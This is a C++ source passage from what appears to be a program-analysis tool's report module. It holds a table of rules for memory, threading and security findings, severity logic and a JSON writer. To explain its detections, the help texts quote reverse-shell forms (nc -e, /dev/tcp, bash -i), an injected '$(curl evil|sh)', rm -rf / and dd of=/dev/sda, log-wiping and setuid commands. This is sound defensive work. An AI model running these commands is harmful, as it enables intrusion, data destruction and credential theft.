#include "internal.h"
#include "malware.h"
#include "protocol.h"
#include "vulnerability.h"

#include <cstdio>
#include <fstream>
#include <iostream>

namespace lcreport {

const std::vector<Rule> &rules() {
    static const std::vector<Rule> table = [] {
    std::vector<Rule> t = {
        {lcproto::kLeak, "MemoryLeak", "Heap memory is never released",
         "A block was still allocated when the program ended and no pointer to "
         "it "
         "remained (definitely lost), or only pointers into its middle "
         "remained "
         "(possibly lost). Release it on every path, or hand ownership to a "
         "smart "
         "pointer or container."},
        {lcproto::kDoubleFree, "DoubleFree", "Memory is released twice",
         "The same block was passed to free/delete a second time. The second "
         "release "
         "can corrupt the allocator. Set pointers to null after releasing "
         "them, or use "
         "std::unique_ptr."},
        {lcproto::kInvalidFree, "InvalidFree",
         "Release of memory that is not a heap block",
         "free/delete was given an address that the allocator never returned: "
         "a stack or "
         "global address, a pointer into the middle of a block, or a stale "
         "value."},
        {lcproto::kUseAfterFree, "UseAfterFree",
         "Use of memory after it was released",
         "A dangling pointer was used to read or write a block that had "
         "already been "
         "released."},
        {lcproto::kOverflow, "HeapBufferOverflow",
         "Write past the end of a heap block",
         "The program accessed bytes beyond the size it requested."},
        {lcproto::kUnderflow, "HeapBufferUnderflow",
         "Write before the start of a heap block",
         "The program accessed bytes before the start of the block."},
        {lcproto::kMismatch, "AllocDeallocMismatch",
         "Mismatched allocation and release functions",
         "malloc must be paired with free, new with delete and new[] with "
         "delete[]."},
        {lcproto::kSizeMismatch, "FreeSizeMismatch",
         "Object deleted through the wrong type",
         "Sized delete received a size different from the allocation, "
         "typically when "
         "deleting a derived object through a base pointer without a virtual "
         "destructor."},
        {lcproto::kDangling, "DanglingPointer",
         "Pointer to an object that no longer exists",
         "The address of a local variable escapes its scope, so the pointer "
         "dangles once the function returns; or data the program still uses "
         "keeps a pointer to a heap block it freed. Nothing fails until some "
         "later path follows the pointer, which then reads or writes freed "
         "memory. Clear or replace the pointer when the object goes away."},
        {lcproto::kResourceLeak, "ResourceLeak",
         "A file descriptor, stream, directory, thread or child process is "
         "never released",
         "A descriptor (open, socket, pipe, dup, ...), FILE stream (fopen, "
         "popen), directory stream (opendir), joinable thread or child "
         "process was never closed, joined, detached or waited for. Each one "
         "holds a kernel or library resource; a long-running program that "
         "leaks them per request runs out. Release it on every path, or use "
         "an RAII wrapper."},
        {lcproto::kDoubleClose, "DoubleClose", "A resource is closed twice",
         "The same descriptor, stream or directory was closed a second time. "
         "Closing a FILE or DIR twice corrupts the heap; closing a "
         "descriptor twice can close an unrelated file another thread has "
         "just opened with the same number."},
        {lcproto::kUseAfterClose, "UseAfterClose",
         "Use of a resource after it was closed",
         "A stream or descriptor was used after it had been closed. At run "
         "time this is a read, write, send, recv, connect, bind, listen or "
         "shutdown on a descriptor number that close() released, which the "
         "kernel refuses with EBADF, or fread, fwrite, fgets or fprintf on a "
         "FILE* that fclose() released. The data is lost, the error is "
         "usually ignored, and in a threaded program the number may already "
         "name another thread's file. A second fclose() is a double close "
         "(the stream's memory would be freed twice) and is not passed on. "
         "Stop using the descriptor or the stream when you close it."},
        {lcproto::kLockLeak, "LockLeak", "A mutex is never unlocked",
         "A function returns with a mutex held on some paths although it "
         "unlocks it on others, or a thread ends while holding one. The next "
         "thread that locks it waits forever. Unlock on every path, or use a "
         "lock guard."},
        {lcproto::kDoubleLock, "DoubleLock", "A held mutex is locked again",
         "The same thread locks a mutex it already holds. A non-recursive "
         "mutex deadlocks; a recursive one stays held after the matching "
         "unlock."},
        {lcproto::kLockOrder, "LockOrderInversion",
         "Mutexes are locked in conflicting orders (potential deadlock)",
         "One path locks mutex A and then B while another locks B and then A "
         "(or a longer cycle). When two threads run them at the same time, "
         "each waits for the other forever; until the timing lines up the "
         "program works. Always lock in one order, or take both at once "
         "with std::scoped_lock."},
        {lcproto::kSignalUnsafe, "SignalUnsafeCall",
         "A signal handler calls a function that is not async-signal-safe",
         "A signal can interrupt the program anywhere, including inside "
         "malloc() or printf() while they hold a lock. A handler that calls "
         "them then waits for that lock forever or corrupts the heap; it "
         "happens rarely, so the program seems fine. Set a volatile "
         "sig_atomic_t flag or write() to a pipe, and do the work outside "
         "the handler."},
        {lcproto::kInheritedFd, "InheritedDescriptor",
         "A descriptor leaks into a child program",
         "The program started another one (system, popen, posix_spawn) while "
         "holding a descriptor without close-on-exec. The child keeps its "
         "copy open for as long as it runs: a listening port cannot be "
         "bound again, a pipe's reader never sees end of file, a deleted "
         "file's space is not freed. Create descriptors with O_CLOEXEC / "
         "SOCK_CLOEXEC / pipe2(O_CLOEXEC)."},
        {lcproto::kUnlockedWait, "UnlockedConditionWait",
         "A condition variable is waited on without holding its mutex",
         "pthread_cond_wait() unlocks the mutex and takes it back, so the "
         "caller must hold it. Without it, a signal sent between checking "
         "the condition and starting the wait is lost and the waiter sleeps "
         "on, which shows only under load. Lock the mutex, check the "
         "condition in a loop, then wait."},
        {lcproto::kForeignUnlock, "ForeignUnlock",
         "A mutex is unlocked by a thread that does not hold it",
         "Unlocking a normal mutex that another thread holds (or that is not "
         "locked) is undefined: it seems to work, until two threads are "
         "inside the critical section together. Unlock in the thread that "
         "locked, or use a semaphore to signal between threads."},
        {lcproto::kDoubleJoin, "DoubleJoin",
         "A thread is joined or detached twice",
         "Once a thread is joined or detached, its pthread_t is stale: the C "
         "library hands the same handle to the next thread it starts. A "
         "second pthread_join() or pthread_detach() then waits for, or "
         "detaches, an unrelated thread, or crashes. Join or detach each "
         "thread exactly once, and clear the handle after."},
        {lcproto::kDestroyLocked, "DestroyLockedLock",
         "A lock is destroyed while it is held",
         "Destroying a locked mutex, read-write lock or spin lock is "
         "undefined. glibc answers EBUSY for a mutex, which programs rarely "
         "check, and the memory is then freed or reused while a thread may "
         "still unlock it or wait for it. Unlock it, and make sure no "
         "thread can still use it, before destroying it."},
        {lcproto::kUseAfterDestroy, "UseAfterDestroy",
         "A mutex is used after it was destroyed",
         "After pthread_mutex_destroy() glibc marks the mutex invalid: a "
         "lock answers EINVAL instead of locking, so a caller that ignores "
         "the result enters its critical section unprotected. It is typical "
         "of shutdown code that destroys a mutex while another thread can "
         "still reach it. Destroy it last, or initialise it again before "
         "reuse."},
        {lcproto::kUncheckedStream, "UncheckedStream",
         "A stream is used before checking that it opened",
         "fopen(), popen() and opendir() return NULL when they fail (no such "
         "file, no permission, too many open files). Passing that NULL to "
         "fgets(), fprintf(), readdir() or fclose() crashes. Test the result "
         "before the first use."},
        {lcproto::kThreadStackArg, "ThreadStackArgument",
         "A thread is handed the address of a local that changes",
         "pthread_create() was given &i (or another local) while the loop "
         "keeps changing it: the thread starts later and reads whatever the "
         "variable holds by then, usually the last value for every thread, "
         "or a stack slot the loop reused. It works when the threads start "
         "fast and fails under load. Pass the value itself "
         "((void *)(intptr_t)i), or a heap copy or array element per "
         "thread, and join before the variable goes away."},
        {lcproto::kSpuriousWakeup, "SpuriousWakeup",
         "A condition wait is not inside a loop that tests the condition",
         "pthread_cond_wait() may return without a signal (a spurious "
         "wakeup), or after another thread has already taken what the "
         "signal announced. Code that waits once and then goes on works for "
         "years and fails on a busy or different system. Wait in a loop: "
         "while (!ready) pthread_cond_wait(&cv, &m);"},
        {lcproto::kOrphanedLock, "OrphanedLock",
         "A mutex is locked whose owner thread no longer exists",
         "The mutex is still locked by a thread that ended while holding it, "
         "or by another thread of the parent when the process forked: the "
         "child has only the thread that called fork(), so nothing will ever "
         "unlock it and the next lock waits forever. After fork() in a "
         "multi-threaded program the child may only call "
         "async-signal-safe functions until it execs; take the lock in a "
         "pthread_atfork() handler, or fork before starting threads."},
        {lcproto::kThreadUnsafe, "ThreadUnsafeCall",
         "A function that keeps its state in a static buffer is called from "
         "several threads",
         "strtok(), localtime(), gmtime(), ctime(), asctime(), getpwnam(), "
         "gethostbyname(), inet_ntoa() and a few more return a pointer into a "
         "buffer, or keep a scan position, that every thread shares. Two "
         "threads calling one at the same time overwrite each other's "
         "result: a wrong timestamp, a half-split string, a crash, once in "
         "a long while. Use the _r variant (localtime_r, strtok_r, "
         "getpwnam_r, ...), or take one lock around the call and the use of "
         "its result."},
        {lcproto::kSigpipe, "SigpipeExposure",
         "A socket send can kill the process when the peer disconnects",
         "send() on a stream socket whose peer has closed raises SIGPIPE, and "
         "the default action of SIGPIPE ends the process: one client hanging "
         "up kills the server, usually in production and never in a test. "
         "Pass MSG_NOSIGNAL to send(), or ignore SIGPIPE once at startup "
         "(signal(SIGPIPE, SIG_IGN)) and check for EPIPE."},
        {lcproto::kEofSpin, "SocketEofSpin",
         "A loop keeps reading a socket whose peer has closed",
         "read() or recv() returned 0 a thousand times in a row on a stream "
         "socket: the peer closed the connection, and the loop does not treat "
         "end of file as the end. The thread spins at full CPU until the "
         "program is stopped. Close the socket and leave the loop when a "
         "read returns 0."},
        {lcproto::kEagain, "SocketEagainSpin",
         "A loop keeps reading a socket that has nothing to read",
         "read() or recv() returned EAGAIN a thousand times in a row on a "
         "stream socket: the socket is non-blocking and the loop does not "
         "wait. The thread spins at full CPU. Wait with poll() or "
         "epoll_wait(), and leave the loop when the peer closes."},
        {lcproto::kBindReuse, "BindWithoutReuseAddr",
         "A server binds a TCP port without SO_REUSEADDR",
         "bind() to a fixed port on a stream socket that has neither "
         "SO_REUSEADDR nor SO_REUSEPORT. After the server exits, or crashes "
         "with clients connected, the port stays in TIME_WAIT and the next "
         "start fails with \"Address already in use\" for a minute or more. "
         "Call setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one) "
         "before bind()."},
        {lcproto::kFdLimit, "DescriptorLimit",
         "The process ran out of file descriptors",
         "open(), socket(), accept(), pipe() or another call that makes a "
         "descriptor failed with EMFILE or ENFILE. A server that leaks one "
         "descriptor per connection gets here after hours, and then refuses "
         "every client (accept() in a loop fails at full CPU). The report "
         "names the call site that opened most of the descriptors still "
         "open: that is the leak. Close it on every path, or raise the "
         "limit only after that."},
        {lcproto::kSelectOverflow, "SelectOverflow",
         "select() is called with nfds past FD_SETSIZE",
         "select() and pselect() are told to watch more descriptors than an "
         "fd_set can hold (FD_SETSIZE, 1024 on Linux). The kernel copies that "
         "many bits from the sets the caller passed, which are only FD_SETSIZE "
         "bits, so it reads and writes past them, usually on the stack. nfds "
         "up to FD_SETSIZE is fine. Use poll() or epoll_wait(), which take a "
         "list instead of a fixed bit set."},
        {lcproto::kReverseShell, "ReverseShell",
         "The program gives a command shell to a network connection",
         "A shell was started with its standard input or output on a socket, "
         "or a command line connects a shell to the network (/dev/tcp, nc -e, "
         "socat EXEC, bash -i >&). Whoever is at the other end can type "
         "commands on this machine: this is how a reverse shell or a bind "
         "shell, the usual backdoor of a trojan, works. A server that runs "
         "commands for its clients does it on purpose; nothing else should."},
        {lcproto::kDropper, "Dropper",
         "The program writes or downloads code and runs it",
         "The program started a file it had written itself, piped a download "
         "or a decoded text into a shell, or made a file in /tmp executable. "
         "A trojan downloader does exactly this: the harmful part is not in "
         "the file you were given, it is fetched and started when the "
         "program runs. An installer or a build tool does it on purpose; check "
         "where the code comes from."},
        {lcproto::kFileless, "FilelessExec",
         "The program starts code that exists only in memory",
         "A program was started from a memfd_create() file or from a file "
         "that has been deleted. Nothing is left on disk for a virus scanner "
         "to read, which is why malware does it. JIT compilers and some "
         "sandboxes do it too, but they do not start whole executables."},
        {lcproto::kPersistence, "Persistence",
         "The program arranges to run again at login or boot",
         "A file was opened for writing that the system reads at login or at "
         "boot: a shell start-up file, a cron table, an autostart entry, a "
         "service, the list of SSH keys, /etc/ld.so.preload, the account or "
         "sudo files. A trojan uses it to survive a restart and to get back "
         "in. An installer does it on purpose; a program that has no reason "
         "to should not."},
        {lcproto::kCredAccess, "CredentialAccess",
         "The program reads passwords, keys, or what is typed",
         "A file was opened that holds secrets: /etc/shadow, an SSH private "
         "key, cloud and registry credentials, a browser's saved logins and "
         "cookies, a wallet, the memory or environment of another process, or "
         "the keyboard device (a key logger reads it). ssh, git and password "
         "managers read them for you; a program that does not need them is "
         "stealing them."},
        {lcproto::kInjection, "ProcessInjection",
         "The program reads or rewrites another running program",
         "ptrace() attached to another process or wrote into its memory, "
         "process_vm_writev() wrote into it, or /proc/<pid>/mem was opened "
         "for writing. This is how code is injected into a running program to "
         "hide inside it or to steal what it holds. Debuggers do it with "
         "your leave; nothing else should."},
        {lcproto::kAntiAnalysis, "AntiAnalysis",
         "The program defends itself against being examined",
         "The program traces itself with ptrace(PTRACE_TRACEME) or attaches to "
         "its own parent (so that no debugger can attach), or deletes its own "
         "executable. Malware does these things to make analysis hard; "
         "normal programs have no reason to."},
        {lcproto::kPrivEsc, "PrivilegeEscalation",
         "The program tries to gain root rights or keep them",
         "A file was given the setuid or setgid bit, a command line does so "
         "(chmod u+s, chmod 4755, setcap cap_setuid, NOPASSWD in sudoers), or "
         "a program that is not root asked to become user 0. A setuid copy of "
         "a shell is the classic way to keep root after an exploit."},
        {lcproto::kLogTamper, "LogTampering",
         "The program erases the record of what happened",
         "A system log (/var/log, utmp, wtmp) or the shell history was "
         "removed or emptied, or a command line does so (history -c, rm "
         "/var/log/..., HISTFILE=/dev/null). Malware wipes the traces of its "
         "break-in; a program has no other reason to delete another "
         "program's log."},
        {lcproto::kDestructive, "DestructiveCommand",
         "The program runs a command that destroys data",
         "A command line removes the whole file system (rm -rf /), overwrites "
         "or formats a disk (dd of=/dev/sda, mkfs) or is a fork bomb. This is "
         "what a wiper or a logic bomb runs when its time comes."},
        {lcproto::kFormatString, "FormatString",
         "A format string that is not a literal, with nothing after it",
         "printf(buf), fprintf(f, buf), syslog(p, buf) and snprintf(b, n, buf) "
         "treat buf as the format. If it holds a %, the function reads "
         "arguments that were never passed (a leak of the stack), and %n "
         "writes to memory: a classic way to take over a program. Print "
         "text with printf(\"%s\", buf). Reported as stronger when the text "
         "comes from the environment, a command-line argument or a read."},
        {lcproto::kCmdInjection, "CommandInjection",
         "A command line made from text that comes from outside",
         "system(), popen() or exec*(\"sh\", \"-c\", ...) was given a string "
         "built from getenv(), argv or data read from a file or socket. A "
         "value such as `x; rm -rf ~` or `$(curl evil|sh)` then runs with the "
         "program's rights. Pass the arguments to execv() without a shell, "
         "or check them against a fixed list."},
        {lcproto::kUnboundedCopy, "UnboundedCopy",
         "A copy into a fixed array with no check on the length",
         "strcpy(), strcat() or sprintf() into a local array: from a literal "
         "longer than the array (it overflows every time), or from text "
         "that comes from outside (it overflows when the value is long "
         "enough, overwriting the return address). Use snprintf() or "
         "check the length before copying."},
        {lcproto::kUnboundedAlloca, "UnboundedAlloca",
         "alloca() is given a size that comes from outside the program",
         "alloca() takes its size from a value that came from outside (an "
         "argument, the environment, a read). The stack frame is that big, "
         "and a long value walks off the stack. alloca(64) and "
         "alloca(sizeof buf) are fixed and are not reported. Use malloc() "
         "and reject a size you cannot afford."},
        {lcproto::kUnsafeFunction, "UnsafeFunction",
         "A function that cannot be used safely",
         "gets() and getwd() write any amount into the buffer; mktemp(), "
         "tmpnam() and tempnam() only choose a name, so another user can "
         "create a file or symlink of that name first; scanf(\"%s\") with no "
         "width reads a word of any length. Use fgets(), getcwd(), mkstemp() "
         "and a width in the format."},
        {lcproto::kHardcodedSecret, "HardcodedSecret",
         "A password, key or token is written into the program",
         "A variable named like a password, secret, token or key is set to a "
         "literal, a password argument is compared with a literal (a "
         "backdoor when the literal is not the real credential), or a string "
         "has the shape of a private key or a cloud access token. Everyone "
         "who has the binary or the source has it. Read it from the "
         "environment or a file only the owner can read."},
        {lcproto::kToctou, "TimeOfCheckTimeOfUse",
         "A file is checked with access() and then used",
         "Between access(path) and open(path) another process can replace the "
         "file, for example with a symlink to one the caller may not read: "
         "the check was true for a different file. Call open() directly and "
         "look at errno; drop privileges first if the point was to act as the "
         "caller."},
        {lcproto::kBadPermissions, "InsecurePermissions",
         "A file is made writable by every user",
         "chmod(path, 0777) or 0666, or umask(0), lets any user on the "
         "machine change the file or the ones the program creates later. "
         "Whoever can write a script, a configuration or a library the "
         "program reads later controls the program. Give the owner and a "
         "group the write bit and nobody else."},
        {lcproto::kPathTraversal, "PathTraversal",
         "A path is built by joining outside text onto a directory",
         "open() or fopen() is given a path made with snprintf(\"%s/%s\") or by "
         "appending text from outside the program onto a directory. A value "
         "such as ../etc/passwd leaves that directory. Reject \"..\" before "
         "opening, or open the directory and use openat()."},
        {lcproto::kWeakCrypto, "WeakCrypto",
         "A broken or weak cryptographic algorithm",
         "MD5, SHA-1, DES, RC4, ECB mode and crypt() are broken for secrecy "
         "and for signatures (collisions can be made, keys can be searched). "
         "They are fine as a checksum nobody attacks. For passwords, "
         "signatures and encryption use SHA-256 or better, AES-GCM or "
         "ChaCha20-Poly1305, and a password hash such as argon2 or bcrypt."},
        {lcproto::kMasquerade, "Masquerade",
         "The program pretends to be something the system or a trusted site runs",
         "A process takes the name of a kernel thread or of a system service "
         "(prctl(PR_SET_NAME, \"kworker/0:1\"), a program started under another "
         "name, a program called sshd that runs from /tmp), a file with such a "
         "name is made in a temporary or hidden directory, or a command or "
         "lookup uses a host name built to look like a site you trust "
         "(github.com.update.example, paypa1.com, micros0ft.com). A name proves "
         "nothing: where the file lives, and what the host name really ends in, "
         "does. Malware picks these names so that a glance at the process list, "
         "PATH or the address bar does not stop anyone."},
        {lcproto::kSystemTamper, "SystemTampering",
         "The program changes the programs and libraries the system trusts",
         "A file under /bin, /sbin, /usr/bin, /usr/sbin, /usr/lib, /lib or /boot "
         "was opened for writing, replaced, removed or given new permissions. "
         "A package manager does it; so does a trojan that swaps ls, ps, ssh or "
         "a library for its own copy so that it stays hidden and runs with "
         "every login. Nothing else should touch those files."},
        {lcproto::kMalware, "MalwareSignature",
         "A file contains what only malware contains",
         "The bytes of a file hold the standard EICAR antivirus test string, "
         "the address of a mining pool, the name of a known web shell, the "
         "text of a ransom note, or PHP that gives a request's input to eval() "
         "or system(). The scan does not run the file: it reads it. A report "
         "is not proof (documentation can quote a ransom note), but a program "
         "or script that has one deserves a look before it is run."},
        {lcproto::kDisguised, "DisguisedExecutable",
         "A program is named like a document or a picture",
         "The file is a Linux, Windows or macOS program, or a script, but its "
         "name ends in .pdf, .jpg, .txt, .doc, .mp3 or another extension of "
         "something that is only read. Double-clicked, it runs instead of "
         "opening. Malware that arrives as an attachment is named this way "
         "so that it is opened."},
        {lcproto::kSuspiciousBin, "SuspiciousBinary",
         "A program is built the way malware is built",
         "The program is packed (UPX, ASPack, Themida, ...) or its bytes look "
         "encrypted, a segment is both writable and executable, it asks for an "
         "executable stack, it starts outside its code, its section table was "
         "cut off, or it is a shared library that defines readdir() or "
         "getdents(), which hides files and processes from every program once "
         "it is preloaded. Some of these are also done by honest software "
         "(UPX is used on legitimate releases); together they are what a "
         "packer or a rootkit looks like."},
        {lcproto::kObfuscated, "ObfuscatedCode",
         "A script decodes text and runs the result",
         "The script feeds decoded text (base64, gzip, rot13, character codes) "
         "to exec(), eval() or Invoke-Expression, runs PowerShell with "
         "-EncodedCommand, or holds one very long base64 line. A reader and a "
         "scanner see only the encoded text; whatever it holds runs at the "
         "first line. Malware loaders are written this way. Installers and "
         "minifiers sometimes are too: read the decoded text before running it."},
        {lcproto::kRansom, "RansomwarePattern",
         "Many files were renamed by adding one new extension",
         "The program renamed twenty files by adding the same new ending "
         "(.locked, .enc, .crypt, ...) to their names. Ransomware encrypts "
         "each file and marks it that way. Backup and rotation endings (.bak, "
         ".old, .orig, .tmp, .gz, ...) are not counted."},
        {lcproto::kNetScan, "NetworkScan",
         "The program tried a hundred different addresses or ports in ten seconds",
         "connect() was called for a hundred distinct address and port pairs "
         "within ten seconds. A worm or a bot looks for victims this way; a "
         "port scanner (nmap) and a program that checks a big list of "
         "servers do it on purpose."},
        {lcproto::kMiner, "Cryptominer",
         "The program starts or contains a cryptocurrency miner",
         "A command line starts a miner (xmrig, minerd, stratum+tcp:// pool "
         "address), or a file holds the miner's identifying strings. Miners "
         "are the most common payload of a trojan: the machine works for "
         "someone else at full CPU."},
    };
    // The 100 families of --malware: a rule for each that has no hand-written one above.
    for (const lcmal::Family &f : lcmal::kFamilies) {
        bool known = false;
        for (const Rule &r : t)
            known |= !strcmp(r.id, f.type);
        if (!known)
            t.push_back({f.type, f.name, f.summary, f.help});
    }
    // Vulnerabilities: ensure every CWE Top 25 finding type has a registered rule.
    for (const lcvuln::VulnInfo &v : lcvuln::kVulns) {
        bool known = false;
        for (const Rule &r : t)
            known |= !strcmp(r.id, v.type);
        if (!known)
            t.push_back({v.type, v.name, v.summary, v.help});
    }
    return t;
    }();
    return table;
}

const Rule *find_rule(const std::string &id) {
    for (const Rule &r : rules())
        if (id == r.id)
            return &r;
    return nullptr;
}

std::string hex(uint64_t v) {
    char b[32];
    std::snprintf(b, sizeof b, "0x%llx", static_cast<unsigned long long>(v));
    return b;
}

std::string severity_of(const Finding &f) {
    if (f.category == "static")
        return "warning";
    // Things an installer, ssh or a debugger also do: the person reading the
    // report knows whether the program was meant to. The rest are not done by
    // honest programs.
    if (f.category == lcproto::kCatSecurity || f.category == lcproto::kCatScan) {
        // A family whose signs are shared with honest software is a warning.
        if (const lcmal::Family *fam = lcmal::family_of(f.type.c_str()); fam && fam->weak)
            return "warning";
        return f.type == lcproto::kPersistence ||
                       f.type == lcproto::kSuspiciousBin ||
                       f.type == lcproto::kCredAccess ||
                       f.type == lcproto::kDropper ||
                       f.type == lcproto::kSystemTamper ||
                       f.type == lcproto::kObfuscated ||
                       f.type == lcproto::kNetScan ||
                       f.type == lcproto::kAiClassifier ||
                       f.type == lcproto::kAntiAnalysis
                   ? "warning"
                   : "error";
    }
    if (f.type == lcproto::kLeak) {
        if (f.category == lcproto::kCatDefinite)
            return "error";
        if (f.category == lcproto::kCatPossible)
            return "warning";
        return "note";
    }
    // Still open at exit: certainly not released, but often on purpose. The
    // same for a descriptor a child inherits.
    if (f.type == lcproto::kResourceLeak || f.type == lcproto::kInheritedFd)
        return "warning";
    // Nothing has gone wrong yet, and the pointer may never be followed.
    if (f.type == lcproto::kDangling)
        return "warning";
    // A fragile start-up, not a failure of this run.
    if (f.type == lcproto::kBindReuse)
        return "warning";
    return "error";
}

bool is_resource(const Finding &f) {
    return f.category == lcproto::kCatFd || f.category == lcproto::kCatStream ||
           f.category == lcproto::kCatDir ||
           f.category == lcproto::kCatThread ||
           f.category == lcproto::kCatProcess;
}

bool is_problem(const Finding &f) {
    const std::string s = severity_of(f);
    return s == "error" || s == "warning";
}

namespace {
bool system_path(const std::string &file) {
    return file.rfind("/usr/", 0) == 0 || file.rfind("/lib", 0) == 0 ||
           file.find("/glibc-") != std::string::npos;
}

// The program's own frames: glibc's debug info names its sources with
// relative paths ("./libio/fileops.c"), so the module tells them apart.
const Frame *pick(const std::vector<Frame> &stack) {
    for (const Frame &fr : stack)
        if (!fr.file.empty() && !system_path(fr.file) &&
            !system_path(fr.module))
            return &fr;
    for (const Frame &fr : stack)
        if (!fr.file.empty())
            return &fr;
    return stack.empty() ? nullptr : &stack.front();
}
} // namespace

const Frame *primary_frame(const Finding &f) {
    const std::vector<Frame> *order[3];
    // Dynamic leaks are best located where the block was allocated; static
    // findings (leaks included) where the problem happens.
    if ((f.type == lcproto::kLeak || f.type == lcproto::kResourceLeak) &&
        f.category != "static")
        order[0] = &f.alloc, order[1] = &f.access, order[2] = &f.freed;
    else
        order[0] = &f.access, order[1] = &f.alloc, order[2] = &f.freed;
    for (auto *s : order)
        if (const Frame *fr = pick(*s); fr && !fr->file.empty())
            return fr;
    for (auto *s : order)
        if (!s->empty())
            return &s->front();
    return nullptr;
}

const char *access_label(const Finding &f) {
    if (f.category == "static")
        return "here";
    if (f.category == lcproto::kCatScan)
        return "found here";
    if (f.category == lcproto::kCatSecurity)
        return "done here";
    if (f.type == lcproto::kDoubleFree)
        return "second release here";
    if (f.type == lcproto::kDoubleClose)
        return "second close here";
    if (f.type == lcproto::kUseAfterClose)
        return "used here, after it was closed";
    if (f.type == lcproto::kSelectOverflow)
        return "called here";
    if (f.type == lcproto::kFdLimit)
        return "failed here";
    if (f.type == lcproto::kLockOrder)
        return "locked here, while holding the other mutex";
    if (f.type == lcproto::kDoubleLock)
        return "locked again here";
    if (f.type == lcproto::kLockLeak)
        return "locked here";
    if (f.type == lcproto::kSignalUnsafe)
        return "called here, inside the handler";
    if (f.type == lcproto::kInheritedFd)
        return "inherited by the program started here";
    if (f.type == lcproto::kDangling)
        return "the block holding the pointer was allocated here";
    if (f.type == lcproto::kUnlockedWait)
        return "waited here";
    if (f.type == lcproto::kForeignUnlock)
        return "unlocked here";
    if (f.type == lcproto::kDoubleJoin)
        return "joined or detached again here";
    if (f.type == lcproto::kDestroyLocked)
        return "destroyed here";
    if (f.type == lcproto::kUseAfterDestroy)
        return "used here, after it was destroyed";
    if (f.type == lcproto::kInvalidFree || f.type == lcproto::kMismatch ||
        f.type == lcproto::kSizeMismatch)
        return is_resource(f) ? "closed here" : "released here";
    if (f.message.find("guard page") != std::string::npos)
        return "accessed here";
    return "detected here";
}

const char *alloc_label(const Finding &f) {
    if (f.type == lcproto::kInvalidFree)
        return "the enclosing block was allocated here";
    if (f.category == lcproto::kCatThread || f.category == lcproto::kCatProcess)
        return "created here";
    if (f.type == lcproto::kLockOrder)
        return "locked in the opposite order here";
    if (f.type == lcproto::kSignalUnsafe)
        return "handler installed here";
    if (f.category == lcproto::kCatLock) // found at run time
        return f.type == lcproto::kLockLeak ? "thread created here"
                                            : "first locked here";
    if (f.type == lcproto::kLockLeak || f.type == lcproto::kDoubleLock ||
        f.type == lcproto::kForeignUnlock || f.type == lcproto::kUnlockedWait)
        return "locked here";
    if (is_resource(f) || f.type == lcproto::kResourceLeak ||
        f.type == lcproto::kDoubleClose || f.type == lcproto::kUseAfterClose)
        return "opened here";
    return "allocated here";
}

const char *freed_label(const Finding &f) {
    if (f.type == lcproto::kDoubleFree)
        return "first released here";
    if (f.type == lcproto::kDoubleClose)
        return "first closed here";
    if (f.type == lcproto::kUseAfterClose)
        return "closed here";
    if (f.type == lcproto::kLockOrder)
        return "the other mutex was locked here";
    if (f.type == lcproto::kForeignUnlock || f.type == lcproto::kUnlockedWait)
        return "unlocked here";
    if (f.type == lcproto::kDoubleJoin)
        return "first joined or detached here";
    return "released here";
}

bool write_report(const Report &r, const std::string &format,
                  const std::string &path, std::string *error) {
    std::ofstream file;
    std::ostream *os = &std::cout;
    if (!path.empty()) {
        file.open(path, std::ios::out | std::ios::trunc);
        if (!file) {
            *error = "cannot write report to '" + path + "'";
            return false;
        }
        os = &file;
    }
    if (format == "json")
        render_json(r, *os);
    else if (format == "sarif")
        render_sarif(r, *os);
    else
        render_console(r, *os);
    os->flush();
    if (!*os) {
        *error = "failed while writing the report";
        return false;
    }
    return true;
}

// ---- Json ----------------------------------------------------------------

void Json::indent() {
    os_ << '\n';
    for (size_t i = 0; i < first_.size(); ++i)
        os_ << "  ";
}

void Json::comma() {
    if (after_key_) {
        after_key_ = false;
        return;
    }
    if (first_.empty())
        return;
    if (!first_.back())
        os_ << ',';
    first_.back() = false;
    indent();
}

Json &Json::begin_object() {
    comma();
    os_ << '{';
    first_.push_back(true);
    return *this;
}

Json &Json::end_object() {
    bool empty = first_.back();
    first_.pop_back();
    if (!empty)
        indent();
    os_ << '}';
    if (first_.empty())
        os_ << '\n';
    return *this;
}

Json &Json::begin_array() {
    comma();
    os_ << '[';
    first_.push_back(true);
    return *this;
}

Json &Json::end_array() {
    bool empty = first_.back();
    first_.pop_back();
    if (!empty)
        indent();
    os_ << ']';
    return *this;
}

Json &Json::key(const std::string &k) {
    comma();
    str(k);
    os_ << ": ";
    after_key_ = true;
    return *this;
}

Json &Json::value(const std::string &v) {
    comma();
    str(v);
    return *this;
}

// The length of the well-formed UTF-8 sequence that starts at s[i] (n bytes remain),
// or 0 if it is not one (a stray byte, a truncated or overlong sequence, a surrogate).
static size_t utf8_length(const unsigned char *s, size_t n) {
    const unsigned char c = s[0];
    size_t len = c >= 0xC2 && c <= 0xDF ? 2 : c >= 0xE0 && c <= 0xEF ? 3 : c >= 0xF0 && c <= 0xF4 ? 4 : 0;
    if (!len || len > n)
        return 0;
    for (size_t k = 1; k < len; ++k)
        if ((s[k] & 0xC0) != 0x80)
            return 0;
    if ((c == 0xE0 && s[1] < 0xA0) || (c == 0xED && s[1] > 0x9F) || (c == 0xF0 && s[1] < 0x90) ||
        (c == 0xF4 && s[1] > 0x8F))
        return 0;
    return len;
}

// Text is UTF-8 when it can be (a path with a letter outside ASCII), and every
// character outside ASCII is written as \u escapes, so the document is plain ASCII.
// A byte that is not part of UTF-8 is written as the character of that number.
void Json::str(const std::string &v) {
    os_ << '"';
    const auto *p = reinterpret_cast<const unsigned char *>(v.data());
    for (size_t i = 0; i < v.size();) {
        const unsigned char c = p[i];
        char b[16];
        switch (c) {
        case '"':
            os_ << "\\\"";
            break;
        case '\\':
            os_ << "\\\\";
            break;
        case '\n':
            os_ << "\\n";
            break;
        case '\r':
            os_ << "\\r";
            break;
        case '\t':
            os_ << "\\t";
            break;
        default:
            if (c >= 0x80) {
                if (const size_t len = utf8_length(p + i, v.size() - i)) {
                    uint32_t cp = len == 2 ? c & 0x1Fu : len == 3 ? c & 0x0Fu : c & 0x07u;
                    for (size_t k = 1; k < len; ++k)
                        cp = (cp << 6) | (p[i + k] & 0x3Fu);
                    if (cp >= 0x10000) {
                        cp -= 0x10000;
                        std::snprintf(b, sizeof b, "\\u%04x\\u%04x", 0xD800 + (cp >> 10), 0xDC00 + (cp & 0x3FF));
                    } else {
                        std::snprintf(b, sizeof b, "\\u%04x", cp);
                    }
                    os_ << b;
                    i += len;
                    continue;
                }
            }
            if (c < 0x20 || c >= 0x7F) {
                std::snprintf(b, sizeof b, "\\u%04x", c);
                os_ << b;
            } else {
                os_ << c;
            }
